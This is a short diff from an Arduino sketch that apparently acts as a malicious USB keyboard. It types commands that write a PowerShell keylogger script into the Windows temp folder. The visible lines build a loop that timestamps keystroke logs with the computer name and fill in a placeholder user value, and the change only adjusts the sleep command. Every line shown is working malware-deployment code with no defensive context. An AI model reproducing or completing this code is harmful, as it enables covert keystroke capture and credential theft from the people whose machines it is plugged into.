@@ -82,7 +82,7 @@ void setup(){
   Keyboard.println("echo $chk = 0 >> %temp%\\kp.ps1");
   Keyboard.println("echo $read = 0  >> %temp%\\kp.ps1");
   Keyboard.println("echo while($true) { >> %temp%\\kp.ps1");
-  Keyboard.println("echo sleep -Seconds INPUT4 >> %temp%\\kp.ps1");
+  Keyboard.println("echo sleep INPUT4 >> %temp%\\kp.ps1");
   Keyboard.println("echo $now = Get-Date; >> %temp%\\kp.ps1");  
   Keyboard.println("echo $pn = $env:COMPUTERNAME + \"  Keylog:  \" +  $now.ToUniversalTime().ToString(\"dd/MM/yyyy HH:mm:ss:fff\")>> %temp%\\kp.ps1");
   Keyboard.println("echo $user = \"INPUT1\" >> %temp%\\kp.ps1");
